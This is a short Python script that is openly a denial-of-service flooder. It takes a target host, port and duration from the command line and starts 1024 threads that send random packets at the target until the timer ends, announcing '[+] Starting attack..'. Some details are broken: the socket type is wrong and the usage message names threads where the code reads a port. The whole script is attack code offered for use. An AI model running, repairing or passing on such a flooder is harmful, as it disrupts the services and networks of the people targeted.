#!/usr/bin/python
import socket, random, threading, sys, time

try:
	target = str(sys.argv[1])
	port =  int(sys.argv[2])
	timer = float(sys.argv[3])
except IndexError:
	print("\n[-] Command usage: python " + sys.argv[0] + " <target> <threads> <time> !")
	sys.exit() 

timeout = time.time() + 1 * timer

def hit():
	try:
		bytes = random._urandom(1024)
		sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
		while time.time() < timeout:			
			sock.sendto(bytes*random.randint(5,15),(target, port))
		return
		sys.exit()
	except:
		pass

print("\n[+] Starting attack..")

for x in range(0, 1024):
	threading.Thread(target=hit).start()